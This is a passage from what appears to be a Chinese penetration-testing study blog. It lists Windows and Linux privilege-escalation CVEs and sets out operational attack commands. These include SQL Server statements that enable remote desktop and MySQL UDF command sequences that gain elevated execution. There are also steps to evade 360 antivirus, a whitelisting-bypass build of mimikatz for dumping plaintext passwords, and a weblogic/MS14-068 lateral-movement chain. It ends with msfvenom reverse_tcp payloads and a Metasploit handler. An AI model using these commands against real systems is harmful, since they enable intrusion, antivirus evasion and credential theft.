class="line">MS12-042 [KB2972621] [Service Bus] (2008&#x2F;2012&#x2F;win7) </span><br><span class="line">MS12-020 [KB2671387] [RDP] (2003&#x2F;2008&#x2F;7&#x2F;XP) </span><br><span class="line">MS11-080 [KB2592799] [AFD.sys] (2003&#x2F;XP) </span><br><span class="line">MS11-062 [KB2566454] [NDISTAPI] (2003&#x2F;XP) </span><br><span class="line">MS11-046 [KB2503665] [AFD.sys] (2003&#x2F;2008&#x2F;7&#x2F;XP) </span><br><span class="line">MS11-011 [KB2393802] [kernel Driver] (2003&#x2F;2008&#x2F;7&#x2F;XP&#x2F;Vista) </span><br><span class="line">MS10-092 [KB2305420] [Task Scheduler] (2008&#x2F;7) </span><br><span class="line">MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5) </span><br><span class="line">MS10-059 [KB982799] [ACL-Churraskito] (2008&#x2F;7&#x2F;Vista) </span><br><span class="line">MS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3&#x2F;2003 SP2&#x2F;Vista SP1 &amp; SP2&#x2F;2008 Gold &amp; SP2 &amp; R2&#x2F;Win7) </span><br><span class="line">MS10-015 [KB977165] [KiTrap0D] (2003&#x2F;2008&#x2F;7&#x2F;XP) </span><br><span class="line">MS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7&#x2F;2008R2) </span><br><span class="line">MS09-050 [KB975517][Remote Code Execution] (2008&#x2F;Vista) </span><br><span class="line">MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0) </span><br><span class="line">MS09-012 [KB959454] [Chimichurri] (Vista&#x2F;win7&#x2F;2008&#x2F;Vista) </span><br><span class="line">MS08-068 [KB957097] [Remote Code Execution] (2000&#x2F;XP) </span><br><span class="line">MS08-067 [KB958644] [Remote Code Execution] (Windows 2000&#x2F;XP&#x2F;Server 2003&#x2F;Vista&#x2F;Server 2008) </span><br><span class="line">MS08-066 [] [] (Windows 2000&#x2F;XP&#x2F;Server 2003) </span><br><span class="line">MS08-025 [KB941693] [Win32.sys] (XP&#x2F;2003&#x2F;2008&#x2F;Vista) </span><br><span class="line">MS06-040 [KB921883] [Remote Code Execution] (2003&#x2F;xp&#x2F;2000) </span><br><span class="line">MS05-039 [KB899588] [PnP Service] (Win 9X&#x2F;ME&#x2F;NT&#x2F;2000&#x2F;XP&#x2F;2003) </span><br><span class="line">MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (&#x2F;NT&#x2F;2000&#x2F;XP&#x2F;2003)</span><br></pre></td></tr></table></figure>
<h2 id="2-Linux提权-依赖EXP篇"><a href="#2-Linux提权-依赖EXP篇" class="headerlink" title="2. Linux提权 依赖EXP篇"></a>2. Linux提权 依赖EXP篇</h2><p>参考链接：<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
<p>常见提权漏洞编号如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2017-1000367 [Sudo] (Sudo 1.8.6p7 - 1.8.20)</span><br><span class="line">CVE-2017-1000112 [a memory corruption due to UFO to non-UFO path switch]</span><br><span class="line">CVE-2017-7494 [Samba Remote execution] (Samba 3.5.0-4.6.4&#x2F;4.5.10&#x2F;4.4.14)</span><br><span class="line">CVE-2017-7308 [a signedness issue in AF_PACKET sockets] (Linux kernel through 4.10.6)</span><br><span class="line">CVE-2017-6074 [a double-free in DCCP protocol] (Linux kernel through 4.9.11)</span><br><span class="line">CVE-2017-5123 [&#39;waitid()&#39;] (Kernel 4.14.0-rc4+)</span><br><span class="line">CVE-2016-9793 [a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options] (Linux kernel before 4.8.14)</span><br><span class="line">CVE-2016-5195 [Dirty cow] (Linux kernel&gt;2.6.22 (released in 2007)</span><br><span class="line">CVE-2016-2384 [a double-free in USB MIDI driver] (Linux kernel before 4.5)</span><br><span class="line">CVE-2016-0728 [pp_key] (3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13,3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6,3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)</span><br><span class="line">CVE-2015-7547 [glibc getaddrinfo] (before Glibc 2.9)</span><br><span class="line">CVE-2015-1328 [overlayfs] (3.13, 3.16.0, 3.19.0)</span><br><span class="line">CVE-2014-5284 [OSSEC] (2.8)</span><br><span class="line">CVE-2014-4699 [ptrace] (before 3.15.4)</span><br><span class="line">CVE-2014-4014 [Local Privilege Escalation] (before 3.14.8)</span><br><span class="line">CVE-2014-3153 [futex] (3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1)</span><br><span class="line">CVE-2014-0196 [rawmodePTY] (2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15)</span><br><span class="line">CVE-2014-0038 [timeoutpwn] (3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)</span><br><span class="line">CVE-2013-2094 [perf_swevent] (3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4,3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3,3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9)</span><br><span class="line">CVE-2013-1858 [clown-newuser] (3.3-3.8)</span><br><span class="line">CVE-2013-1763 [__sock_diag_rcv_msg] (before 3.8.3)</span><br><span class="line">CVE-2013-0268 [msr] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.27, 2.6.28,2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36, 2.6.37,2.6.38, 2.6.39, 3.0.0,3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.5, 3.6, 3.7.0, 3.7.6)</span><br><span class="line">CVE-2012-3524 [libdbus] (libdbus 1.5.x and earlier)</span><br><span class="line">CVE-2012-0056 [memodipper] (2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0)</span><br><span class="line">CVE-2010-4347 [american-sign-language] ( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.62.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-4258 [full-nelson] (2.6.31, 2.6.32, 2.6.35, 2.6.37)</span><br><span class="line">CVE-2010-4073 [half_nelson] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.62.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3904 [rds] (2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3437 [pktcdvd] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.62.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3301 [ptrace_kmod2] (2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)</span><br><span class="line">CVE-2010-3081 [video4linux] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.62.6.31, 2.6.32, 2.6.33)</span><br><span class="line">CVE-2010-2959 [can_bcm] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-1146 [reiserfs] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)</span><br><span class="line">CVE-2010-0415 [do_pages_move] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)</span><br><span class="line">CVE-2009-3547 [pipe.c_32bit] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.42.4.35, 2.4.36, 2.4.37,2.6.15, 2.6.16, 2.6.17,2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.28, 2.6.29,2.6.30, 2.6.31)</span><br><span class="line">CVE-2009-2698 [udp_sendmsg_32bit] (2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19)</span><br><span class="line">CVE-2009-2692 [sock_sendpage] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16,2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.42.4.35, 2.4.36, 2.4.37,2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)</span><br><span class="line">CVE-2009-2692 [sock_sendpage2] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.42.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2,2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15,2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)</span><br><span class="line">CVE-2009-1337 [exit_notify] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)</span><br><span class="line">CVE-2009-1185 [udev] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)</span><br><span class="line">CVE-2008-4210 [ftrex] (2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19,2.6.20, 2.6.21, 2.6.22)</span><br><span class="line">CVE-2008-0600 [vmsplice2] (2.6.23, 2.6.24)</span><br><span class="line">CVE-2008-0600 [vmsplice1] (2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1)</span><br><span class="line">CVE-2006-3626 [h00lyshit] (2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16)</span><br><span class="line">CVE-2006-2451 [raptor_prctl] (2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17)</span><br><span class="line">CVE-2005-0736 [krad3] (2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11)</span><br><span class="line">CVE-2005-1263 [binfmt_elf.c] (Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4)</span><br><span class="line">CVE-2004-1235 [elflbl] (2.4.29)</span><br><span class="line">CVE-N&#x2F;A [caps_to_root] (2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2004-0077 [mremap_pte] (2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27</span><br></pre></td></tr></table></figure>
<h2 id="6-反攻的一次溯源-—-项目实战3"><a href="#6-反攻的一次溯源-—-项目实战3" class="headerlink" title="6. 反攻的一次溯源 — 项目实战3"></a>6. 反攻的一次溯源 — 项目实战3</h2><p>一韩国server  2003服务器，3389存在shift后门，且有一个<code>DHCP</code>查看应用，存在<code>loadfile</code>漏洞（这里我推测就是WEB应用存在SQL注入，可以读取本地文件）。HEX编码读取<code>shift</code>后门，本地再<code>unhex</code>解码回来。然后反编译该后门，获取密码。</p>
<h2 id="7-SqlServer-常用操作远程桌面语句"><a href="#7-SqlServer-常用操作远程桌面语句" class="headerlink" title="7. SqlServer 常用操作远程桌面语句"></a>7. SqlServer 常用操作远程桌面语句</h2><ul>
<li><p>是否开启远程桌面</p>
<ul>
<li> <code>EXEC master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;, &#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;, &#39;fDenyTSConnections&#39;</code></li>
<li> 1：表示关闭</li>
<li> 0：表示开启</li>
</ul>
</li>
<li><p>读取远程桌面端口</p>
<ul>
<li><code>EXEC master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;, &#39;SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&#39;, &#39;PortNumber&#39;</code></li>
</ul>
</li>
<li><p>开启远程桌面</p>
<ul>
<li> <code>EXEC master.dbo.xp_regwrite&#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\TerminalServer&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,0;</code></li>
</ul>
</li>
<li><p>关闭远程桌面</p>
<ul>
<li><code>EXEC master.dbo.xp_regwrite&#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\TerminalServer&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,1;</code></li>
</ul>
</li>
</ul>
<h1 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h1><h2 id="8-模拟诉求任务攻击"><a href="#8-模拟诉求任务攻击" class="headerlink" title="8. 模拟诉求任务攻击"></a>8. 模拟诉求任务攻击</h2><p>第一个shell为目标主站shell，为08 R2。提权后，改为信息收集</p>
<ul>
<li>进程收集</li>
<li>账户搜集</li>
<li>重要路径搜集</li>
<li>数据库密码搜集</li>
<li>杀毒软件搜集</li>
<li>管理员习惯搜集</li>
</ul>
<p>通过信息收集，获得<code>Server 2003</code>机器权限，为一台开发机。目标仅支持 <code>asp</code>，但是服务器中安装有<code> mysql</code>，<code>php</code> 等。并且无 <code>asp to mysql Device Drive IIS</code> 配置中也并不支持 <code>php</code>。继续信息收集</p>
<p><code>type C:\MySQL\MySQL Server 5.0\data\mysql\user.MYD </code>，获得<code>Mysql</code>数据库的<code>ROOT</code>哈希，在非交互式<code>shell</code>下加上<code>-e</code>参数执行SQL语句，使用<code>UDF</code>提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;create table a (cmd LONGBLOB);&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;insert into a (cmd) values hex(load_file(&#39;C:\\xxxx\\xxxx.dll&#39;)));&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;SELECT unhex(cmd) FROM a INTO DUMPFILE &#39;c:\\windows\\system32\\xxxx.dll&#39;;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &#39;udf.dll&#39;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;select shell(&#39;cmd&#39;,&#39;C:\\xxxx\\xxx\\xxxxx.exe&#39;);&quot;</span><br></pre></td></tr></table></figure>
<h2 id="16-红蓝对抗渗透测试1"><a href="#16-红蓝对抗渗透测试1" class="headerlink" title="16. 红蓝对抗渗透测试1"></a>16. 红蓝对抗渗透测试1</h2><ul>
<li>BloodHound</li>
</ul>
<blockquote>
<p>BloodHound是2016年出现大家的视线中，它是一个分析和解读AD中权限关系的一个工具。对于攻击 </p>
<p>者来说，能快速的获取到域中的线索以便进行下一步攻击，而对于防御者来说，可以更快速的得知攻击 </p>
<p>者可能采取的攻击途径以及域中的可突破的途径。</p>
</blockquote>
<p>项目地址： <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a> </p>
<ul>
<li>popy</li>
</ul>
<blockquote>
<p>Pupy是一个开源，跨平台（Windows，Linux，OSX，Android），多功能RAT（远程管理工具）和主 </p>
<p>要用python编写的后期开发工具。它具有全内存读取操作，进程注入等。Pupy可以使用各种传输进行 </p>
<p>通信，迁移到进程（注入），从内存加载远程Python代码</p>
</blockquote>
<p>项目地址： <a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a> </p>
<ul>
<li>GreatSCT</li>
</ul>
<blockquote>
<p>GreatSCT 是以 metasploit payload 为核心，白名单辅助 payload 执行框架</p>
</blockquote>
<p>项目地址： <a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a> </p>
<h2 id="51-项目回忆：体系的本质是知识点串联"><a href="#51-项目回忆：体系的本质是知识点串联" class="headerlink" title="51. 项目回忆：体系的本质是知识点串联"></a>51. 项目回忆：体系的本质是知识点串联</h2><p>目标机器有360全家桶</p>
<ul>
<li>免杀</li>
</ul>
<p>使用shellcode_launcher对shellcode分离免杀</p>
<ul>
<li>提权</li>
</ul>
<p>在目标机上找到mysql数据库文件,下载<code>users.MYI</code>、<code>users.MYD</code>、<code>users.frm</code>，本地安装<code>mysql</code>加载文件，获取目标数据库的帐号密码</p>
<p>使用非交互模式，使用udf提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;create table mysql.a (cmd LONGBLOB);&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;insert into mysql.a (cmd) values hex(load_file(&#39;C:\\xxxx\\xxxx.dll&#39;)));&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;SELECT unhex(cmd) FROM mysql.a INTO DUMPFILE &#39;c:\\windows\\system32\\xxxx.dll&#39;;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &#39;udf.dll&#39;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;select shell(&#39;cmd&#39;,&#39;whoami&#39;);&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>登录服务器</li>
</ul>
<p>激活guest帐号，并提升到administrator组</p>
<ul>
<li>抓取明文密码</li>
</ul>
<p>先在powershell中执行下面命令，生成Key.snk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$key &#x3D; &#39;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq&#x2F;vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu&#x2F;WxZaffHS2te&#x2F;PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g&#x2F;P+JpXGN0&#x2F;+Hitolufo7Ucjh+WvZAU&#x2F;&#x2F;dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm&#x2F;ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15&#x2F;4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX&#x2F;tqcBuBIg&#x2F;cpcDHps&#x2F;6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b&#x2F;WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">$Content &#x3D; [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>
<p>​    CSC编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe &#x2F;r:System.EnterpriseServices.dll &#x2F;r:System.IO.Compression.dll &#x2F;target:library &#x2F;keyfile:key.snk &#x2F;unsafe &#x2F;out:test.exe mimikatz.cs</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;logToConsole&#x3D;false &#x2F;U test.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>横向渗透</li>
</ul>
<p>搜集目标机的mssql，mysql，rdp 密码，搜 集所在内网的拓扑，来辅助本次的横向扩展</p>
<h2 id="69-渗透，持续渗透，后渗透的本质"><a href="#69-渗透，持续渗透，后渗透的本质" class="headerlink" title="69. 渗透，持续渗透，后渗透的本质"></a>69. 渗透，持续渗透，后渗透的本质</h2><ul>
<li>模拟攻击流程</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击机通过SQL注入，上传webshell 拿到主机A1权限 </span><br><span class="line">主机A1通过weblogic反序列化漏洞拿到主机A2权限 </span><br><span class="line">主机A2通过信息收集，获得主机B权限 </span><br><span class="line">主机B通过MS14-068漏洞获取域控主机C权限</span><br></pre></td></tr></table></figure>
<ul>
<li><p>过程</p>
<ul>
<li><p>扫描主机A1对攻击机开放端口：80,22</p>
</li>
<li><p>扫描主机A1-Web目录结构</p>
</li>
<li><p>主机A1-Web搜索处存在sql注入</p>
</li>
<li><p>登录后台得到shell</p>
</li>
<li><p>msfvenom生成tcp payload 以php一句话执行</p>
</li>
<li><p>配置msf，获得meterpreter shell权限 </p>
</li>
<li><p>A1对内信息搜集发现A2，并且针对A1，没有可用提权漏洞（Web非root权限），放弃提权</p>
</li>
<li><p>以A1作为跳板添加虚拟路由，并且开始做针对A2的对内信息搜集</p>
<ul>
<li>扫描开放端口</li>
</ul>
</li>
<li><p>以A1跳板发现A2部署weblogic，并且存在漏洞。转发目标机7001至本地，利用漏洞</p>
<ul>
<li>portfwd add -r 192.168.1.160 -p 7001 -l 7001</li>
</ul>
</li>
<li><p>msfvenom生成payload 并尝试使用weblogic漏洞上传payload</p>
</li>
<li><p>执行payload,meterpreter获取session，添加路由</p>
</li>
<li><p>发现A2全补丁，放弃提权，（weblogic为user权限）对内信息刺探A2，得到 weblogic相关 </p>
<p>配置文件，解密后，得到密码</p>
</li>
<li><p>尝试做二级跳板，以weblogic相关配置，尝试对B（域内成员）的渗透（SMB）</p>
</li>
<li><p>获取B权限（system），尝试对内B的本身信息搜集，发现域账号（普通成员）user1</p>
</li>
<li><p>尝试三级跳板，尝试获取sid，以及域控对内相关IP，尝试越权，获取域控权限</p>
</li>
<li><p>利用user1生成票据并注入内存</p>
</li>
</ul>
</li>
</ul>
<h2 id="92-：实战中的Payload应用"><a href="#92-：实战中的Payload应用" class="headerlink" title="92. ：实战中的Payload应用"></a>92. ：实战中的Payload应用</h2><p>绕过360套装</p>
<ul>
<li>配置payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby .&#x2F;Micropoor_rev.rb 8080</span><br></pre></td></tr></table></figure>
<ul>
<li>上传Micropoor_shellcode_x64.exe </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>配置msf</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Micropoor_shellcode_x64.exe 8080 192.168.1.4</span><br></pre></td></tr></table></figure>
<h2 id="94-基于实战中的small-payload"><a href="#94-基于实战中的small-payload" class="headerlink" title="94. 基于实战中的small payload"></a>94. 基于实战中的small payload</h2><ul>
<li>payload生成</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.5 LPORT&#x3D;53 ‐b &#39;\x00&#39; ‐f exe &gt; First.exe</span><br></pre></td></tr></table></figure>
<ul>
<li><p>第一次优化</p>
<ul>
<li>payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.5 LPORT&#x3D;53 ‐b &#39;\x00&#39; ‐f c</span><br></pre></td></tr></table></figure>
<ul>
<li>建立Micropoor_small_payload工程</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设置平台工具集： Visual Studio 2017 -Windows XP(v141_xp)</span><br><span class="line">运行库： 多线程（&#x2F;MT）</span><br><span class="line">优化： 使大小最小化（&#x2F;01）</span><br><span class="line">预编译头：不使用预编译头</span><br><span class="line">生成调试信息：否</span><br><span class="line">自定义入口点：execMicropoor_shellcode</span><br></pre></td></tr></table></figure>
<ul>
<li>源码如下</li>
</ul>
